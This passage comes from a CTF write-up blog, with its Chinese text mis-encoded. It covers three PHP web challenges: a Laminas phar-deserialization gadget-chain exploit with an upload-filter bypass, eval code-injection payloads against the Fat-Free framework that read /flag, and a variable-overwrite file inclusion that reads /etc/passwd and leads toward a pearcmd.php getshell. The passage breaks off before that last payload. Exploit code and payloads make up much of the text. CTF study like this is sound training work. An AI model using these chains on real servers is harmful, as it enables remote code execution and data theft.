                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/public/img/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$base</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token variable">$img_path</span><span class="token punctuation">;</span>
                <span class="token variable">$form</span><span class="token operator">-&gt;</span><span class="token function">saveImg</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img Can Be Uploaded!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// Form is valid, save the form!</span>
            <span class="token comment">//return $this-&gt;redirect()-&gt;toRoute('upload-form/success');</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'form'</span> <span class="token operator">=&gt;</span> <span class="token variable">$form</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç™½åå•é™åˆ¶åªèƒ½<code>.jpg .jpeg .png</code>ä¸‰ç§åç¼€ï¼Œæœ‰ä¸€ä¸ªæ­£åˆ™è¿‡æ»¤pharæ–‡ä»¶<code>"/&lt;\?|php|HALT\_COMPILER/i"</code></p>
<p>æ‰¾åˆ©ç”¨ç‚¹ï¼Œåœ¨imgdeleteAction()æœ‰<code>@unlink($imgpath);</code>ï¼Œå¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼ŒåŸç†æ˜¯<code>unlink()</code>å‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">imgdeleteAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$imgpath</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">getPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imgpath'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">white_list</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment">//ç™½åå•</span>
            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$imgpath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Only Img File Can Be Deleted!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ„é€ å¦‚ä¸‹exploitï¼Œæœ¬åœ°phpç¯å¢ƒè¿è¡Œå³ä¼šè‡ªåŠ¨åœ¨å½“å‰ç›®å½•ç”Ÿæˆphar.pharæ–‡ä»¶ï¼ˆç¬”è€…æ­¤å¤„ç”¨çš„æ˜¯phpstudyé›†æˆç¯å¢ƒï¼‰</p>
<p>æ³¨æ„ï¼šè¦å°†php.iniä¸­phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Resolver</span><span class="token punctuation">{</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">TemplateMapResolver</span><span class="token punctuation">{</span>
		<span class="token keyword">protected</span> <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"setBody"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Renderer</span><span class="token punctuation">{</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">PhpRenderer</span><span class="token punctuation">{</span>
		<span class="token keyword">private</span> <span class="token variable">$__helpers</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">__helpers</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Resolver<span class="token punctuation">\</span>TemplateMapResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>Log<span class="token punctuation">\</span>Writer</span><span class="token punctuation">{</span>
	<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">AbstractWriter</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
	
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mail</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractWriter</span><span class="token punctuation">{</span>
		<span class="token keyword">protected</span> <span class="token variable">$eventsToMail</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">protected</span> <span class="token variable">$subjectPrependText</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
		<span class="token keyword">protected</span> <span class="token variable">$mail</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">mail</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Renderer<span class="token punctuation">\</span>PhpRenderer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Laminas<span class="token punctuation">\</span>Log</span><span class="token punctuation">{</span>
	<span class="token keyword">class</span> <span class="token class-name-definition class-name">Logger</span><span class="token punctuation">{</span>
		<span class="token keyword">protected</span> <span class="token variable">$writers</span><span class="token punctuation">;</span>
		<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">writers</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>Log<span class="token punctuation">\</span>Writer<span class="token punctuation">\</span>Mail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span><span class="token punctuation">{</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Laminas<span class="token punctuation">\</span>Log<span class="token punctuation">\</span>Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨xxdæŸ¥çœ‹ç”Ÿæˆçš„pharæ–‡ä»¶16è¿›åˆ¶ç¼–ç ï¼Œåœ¨ASCIIç ä¾§å¯çœ‹åˆ°meta-dataéƒ¨åˆ†åºåˆ—åŒ–çš„æ•°æ®</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814145559560.png"></p>
<p>ç”±äºä¼šå¯¹pharæ–‡ä»¶çš„é™æ€ç‰¹å¾è¿›è¡Œæ­£åˆ™è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥å…ˆgzipå‹ç¼©ï¼Œå†ä¿®æ”¹åç¼€ä¸º.pngï¼Œä»¥æ­¤ç»•è¿‡æ­£åˆ™è¿‡æ»¤</p>
<p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/291992.html">https://www.freebuf.com/articles/web/291992.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814112745664.png"></p>
<p>imguploadAction()è¦æ±‚ä¸Šä¼ æ–‡ä»¶å¤§å°å¿…é¡»å¤§äº3kbï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨å†å°†æ–‡ä»¶å¡«å……åˆ°å¤§äº3kb</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"image-file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"The picture size must be more than 3kb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814112815816.png" style="zoom:80%;">

<p>åœ¨<code>/album/imgupload</code>ä¸Šä¼ ä¿®æ”¹å¥½çš„pngæ–‡ä»¶ï¼Œè¿”å›å›¾ç‰‡çš„è·¯å¾„</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814131104277.png"></p>
<p>ç„¶ååœ¨<code>/album/imgdelete</code>ç”¨pharä¼ªåè®®è®¿é—®å›¾ç‰‡åœ°å€ï¼Œä»è€Œç”¨<code>unlink()</code>å‡½æ•°è§¦å‘pharååºåˆ—åŒ–</p>
<pre class="line-numbers language-none"><code class="language-none">phar:///var/www/public/img/a9a9ccc55eab0928c1f05e1647a12575.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814131253469.png"></p>
<p>ç‚¹å‡»æäº¤ï¼Œåˆ™æˆåŠŸè·å–flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814131326602.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/m0_51078229/article/details/123660344">https://blog.csdn.net/m0_51078229/article/details/123660344</a></p>
<p><a href="https://www.freebuf.com/articles/web/291992.html">https://www.freebuf.com/articles/web/291992.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>phpä»£ç å®¡è®¡</tag>
        <tag>pharååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>HFCTF2021Quals-Unsetme</title>
    <url>/posts/d89784ec.html</url>
    <content><![CDATA[<h1 id="HFCTF2021Quals-Unsetme"><a href="#HFCTF2021Quals-Unsetme" class="headerlink" title="HFCTF2021Quals-Unsetme"></a>HFCTF2021Quals-Unsetme</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šå‘½ä»¤æ‰§è¡Œ</p>
<p>é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230816144351618.png"></p>
<p>æºç é€»è¾‘åˆ†æï¼š</p>
<ol>
<li>å¼•å…¥base.phpå¯åŠ¨æ¡†æ¶,å¹¶å°†æ¡†æ¶å®ä¾‹èµ‹å€¼ç»™$f3ã€‚</li>
<li>è®¾ç½®æ¡†æ¶çš„DEBUGæ¨¡å¼ä¸ºå¯ç”¨ã€‚</li>
<li>æ£€æŸ¥PCRE(Perlå…¼å®¹æ­£åˆ™è¡¨è¾¾å¼)çš„ç‰ˆæœ¬æ˜¯å¦ä½äº8.0,å¦‚æœä½äºåˆ™æŠ›å‡ºé”™è¯¯ã€‚</li>
<li>ä½¿ç”¨highlight_file()å‡½æ•°é«˜äº®æ˜¾ç¤ºå½“å‰æ–‡ä»¶å†…å®¹ã€‚</li>
<li>è·å–GETå‚æ•°açš„å€¼,èµ‹å€¼ç»™<code>$a</code>ã€‚</li>
<li>ä½¿ç”¨unset()åˆ é™¤æ¡†æ¶å®ä¾‹<code>$f3</code>ä¸Šçš„å±æ€§<code>$a</code>ã€‚</li>
<li>è¿è¡Œæ¡†æ¶ã€‚</li>
</ol>
<p>ä¸‹é¢è¿˜æœ‰ä¸‰å¤„æŠ¥é”™ï¼Œæ¶‰åŠä¸¤ä¸ªæ–‡ä»¶ï¼šindex.phpå’Œbase.phpï¼Œåº”è¯¥æ˜¯ä¸€æ¡æ§åˆ¶æµ</p>
<p>FatFreeæ¡†æ¶ï¼š<a href="https://github.com/bcosca/fatfree">https://github.com/bcosca/fatfree</a></p>
<h2 id="æœ¬åœ°è°ƒè¯•"><a href="#æœ¬åœ°è°ƒè¯•" class="headerlink" title="æœ¬åœ°è°ƒè¯•"></a>æœ¬åœ°è°ƒè¯•</h2><p>1.ä¸‹è½½å®˜æ–¹æºç ï¼ˆç¬”è€…è°ƒè¯•ç‰ˆæœ¬æ˜¯fatfree-3.7.3ï¼‰</p>
<p>2.åœ¨æºç æ ¹ç›®å½•ï¼ˆå³index.phpåŒçº§ç›®å½•ï¼‰ï¼Œæ–°å»ºä¸€ä¸ªtest.phpï¼ŒæŠŠé¢˜ç›®æºç å¤åˆ¶è¿›å»</p>
<p>3.å¼€å¯è°ƒè¯•ç¯å¢ƒï¼Œæµè§ˆå™¨è®¿é—®test.php</p>
<p>å› ä¸ºå¯æ§å‚æ•°ä¸ºGETå‚æ•°<code>a</code>ï¼Œæ‰€ä»¥è°ƒè¯•çš„æ—¶å€™é‡ç‚¹å…³æ³¨æ­¤å‚æ•°çš„æµå‘</p>
<p>ï¼ˆ1ï¼‰ä»€ä¹ˆå‚æ•°éƒ½ä¸ä¼ é€’çš„æƒ…å†µä¸‹</p>
<p>æ§åˆ¶æµä¼šä»test.phpçš„12è¡Œunset()å‡½æ•°è¿›å…¥base.phpçš„<code>__unset()</code>é­”æœ¯æ–¹æ³•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091243177.png"></p>
<p>ç„¶åè¿›å…¥offsetunset()æ–¹æ³•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091326401.png"></p>
<p>è¿›å…¥<code>clear()</code>åï¼Œä¼šä¸€è·¯æ‰§è¡Œåˆ°530è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091436508.png"></p>
<p>æ‰§è¡Œ<code>eval('unset('.$val.');');</code>æ—¶ï¼Œè·³è½¬åˆ°2337è¡Œï¼Œæ‰§è¡Œå®Œ2338è¡Œï¼Œwebç«¯è¿”å›å¦‚é¢˜ç›®é¦–é¡µçš„é”™è¯¯</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821091533770.png"></p>
<p>ï¼ˆ2ï¼‰GETä¼ å‚<code>?a=1</code>æ—¶ï¼Œå‰é¢çš„æ§åˆ¶æµè·¯çº¿å’Œæ— å‚æ—¶æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡æ‰§è¡Œ<code>eval('unset('.$val.');');</code>æ—¶ï¼Œä¼šè·³è½¬åˆ°å¦‚ä¸‹ä½ç½®</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821094501336.png"></p>
<p>ä»ä¸Šè¿°åˆ†æå¯è§ï¼Œeval()å‡½æ•°æ˜¯å±é™©å‡½æ•°ï¼Œåˆå› ä¸ºå˜é‡<code>$val</code>æ˜¯<code>@hive</code>æ‹¼æ¥<code>$key</code>ç»è¿‡compile()æ–¹æ³•å¤„ç†å¾—åˆ°ï¼Œ<code>$key</code>æ˜¯ä»GETå‚æ•°<code>a</code>ä¸€è·¯ä¼ é€’è¿‡æ¥çš„ï¼Œå¯æ§ï¼Œæ‰€ä»¥å°±æœ‰äº†æ‰§è¡Œå‘½ä»¤çš„æœºä¼šã€‚å…³é”®åœ¨äºcompile()åšäº†ä»€ä¹ˆå¤„ç†ï¼Œè·Ÿè¸ªå…³é”®ä»£ç å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821103605359.png"></p>
<p>è¿™æ®µä»£ç åŠŸèƒ½ç›¸å½“äºæŠŠ<code>@hive string $a</code>æ›¿æ¢æˆ<code>$hive['string']</code>ï¼Œåˆç”±äº<code>$val</code>å˜é‡èµ‹å€¼çš„æœ€å¤–å±‚æ­£åˆ™ä¼šå°†<code>$hive</code>æ›¿æ¢ä¸º<code>$this-&gt;hive</code>ï¼Œæ‰€ä»¥ç›¸å½“äºä¼ è¿›GETå‚æ•°<code>a=string</code>ï¼Œå¾—åˆ°<code>$var</code>=<code>$this-&gt;hive['string']</code></p>
<p>å¯ä»¥åœ¨eval()ä¹‹å‰æ·»åŠ echoè°ƒè¯•ä¸€ä¸‹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token operator">.</span><span class="token variable">$val</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'unset('</span><span class="token operator">.</span><span class="token variable">$val</span><span class="token operator">.</span><span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä¼ å‚<code>?a=test</code>ï¼Œç»“æœå¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821111417189.png"></p>
<p>ä¼ å‚<code>?a=test%0a);phpinfo(</code>ï¼Œç»“æœå¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821112146364.png"></p>
<p>æ‰€ä»¥ï¼Œè¯»flagå¯ç”¨å¦‚ä¸‹payload</p>
<pre class="line-numbers language-none"><code class="language-none">?a=test%0a);echo file_get_contents(%27/flag%27
?a=test%0a);readfile(%27/flag%27
?a=test%0a);system(%27cat%20/flag%27<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821112415657.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.plasf.cn/articles/hfctfunsetme.html">https://www.plasf.cn/articles/hfctfunsetme.html</a></p>
<p><a href="https://blog.csdn.net/Little_jcak/article/details/123516439">https://blog.csdn.net/Little_jcak/article/details/123516439</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>phpä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>HXBCTF2021-easywill</title>
    <url>/posts/291555d9.html</url>
    <content><![CDATA[<h1 id="HXBCTF2021-easywill"><a href="#HXBCTF2021-easywill" class="headerlink" title="HXBCTF2021-easywill"></a>HXBCTF2021-easywill</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šå˜é‡è¦†ç›–ã€æ–‡ä»¶åŒ…å«ã€åˆ©ç”¨pearcmd.phpå†™shellï¼ˆä¸å‡ºç½‘ï¼‰</p>
<p>é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823145959223.png"></p>
<p>å®˜ç½‘æ²¡æœ‰å¯¹åº”ç‰ˆæœ¬ï¼Œé‚æ‰¾ä½œè€…è¦äº†ä¸€ä»½</p>
<p>æ„Ÿè°¢æ¡†æ¶ä½œè€…<a href="https://gitee.com/willphp/yiyu">æ— å¿µ</a>å’Œä»–çš„çƒ­æƒ…å¸®åŠ©</p>
<h2 id="æœ¬åœ°è°ƒè¯•"><a href="#æœ¬åœ°è°ƒè¯•" class="headerlink" title="æœ¬åœ°è°ƒè¯•"></a>æœ¬åœ°è°ƒè¯•</h2><p>æŠŠ<code>app/controller/IndexController.php</code>ä¿®æ”¹ä¸ºé¢˜ç›®çš„ä»£ç ï¼Œæœ‰ä¸¤ä¸ªGETå‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¦‚ä¸‹ä¼ å‚è°ƒè¯•</p>
<pre class="line-numbers language-none"><code class="language-none">?name=testname&amp;value=testvalue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä»ç¬¬6è¡Œä¼ å‚è¿›å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823152737875.png"></p>
<p>è·³è½¬åˆ°<code>willphp/helper.php</code>206è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823152901910.png"></p>
<p>ç„¶åæ¥åˆ°<code>willphp/wiphp/View.php</code>14è¡Œï¼Œå¯çœ‹åˆ°æ‰§è¡Œå®Œæ¯•åï¼Œ<code>_vars</code>æ•°ç»„é‡Œå­˜å‚¨äº†ä¸€ä¸ªé”®å€¼å¯¹ï¼Œé”®å’Œå€¼åˆ†åˆ«å¯¹åº”GETè¯·æ±‚ä¼ å…¥çš„nameå‚æ•°å€¼å’Œvalueå‚æ•°å€¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823153652373.png"></p>
<p>ç„¶åè¿”å›<code>IndexController.php</code>æ‰§è¡Œç¬¬7è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823154115716.png"></p>
<p>è¿›å…¥view()å‡½æ•°ï¼Œæ¥åˆ°<code>willphp/helper.php</code>215è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823154305064.png"></p>
<p>è¿›å…¥<code>fetch</code>æ–¹æ³•ï¼Œæ¥åˆ°<code>willphp/wiphp/View.php</code>ï¼Œ16-38è¡Œç›¸å½“äºæŠŠå¾…æ¸²æŸ“çš„æ–‡ä»¶è·¯å¾„æ‹¼æ¥å¤„ç†å‡ºæ¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823154808961.png"></p>
<p>è¿›å…¥39è¡Œ<code>render</code>æ–¹æ³•ï¼Œæ¥åˆ°<code>willphp/wiphp/Tple.php</code>çš„14-16è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823155513189.png"></p>
<p>è¿›å…¥renderToæ–¹æ³•ï¼Œå…³é”®åœ¨äº44-45è¡Œï¼Œå¯åˆ©ç”¨å˜é‡è¦†ç›–å®ç°æ–‡ä»¶åŒ…å«</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823160332654.png"></p>
<p>GETä¼ å…¥å¦‚ä¸‹å‚æ•°æ—¶ï¼Œæ‰§è¡Œ<code>extract($_vars);</code>åï¼Œ<code>cfilevalue</code>ä¼šè¦†ç›–æ‰<code>$cfile</code>åŸæ¥çš„å€¼ï¼Œå¦‚ä¸‹å›¾</p>
<pre class="line-numbers language-none"><code class="language-none">?name=cfile&amp;value=cfilevalue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823161628848.png"></p>
<p>æ¯”å¦‚åœ¨é¢˜ç›®ä¸­ä¼ å…¥<code>?name=cfile&amp;value=/etc/passwd</code>ï¼Œå°±ä¼šè¿”å›å¦‚ä¸‹å†…å®¹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823162301045.png"></p>
<p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åŒ…å«pearcmd.phpå®ç°getshell</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/rfrder/article/details/121042290">https://blog.csdn.net/rfrder/article/details/121042290</a></p>
<p>ç”±äºç¯å¢ƒä¸å‡ºç½‘ï¼ŒPayloadï¼š</p>
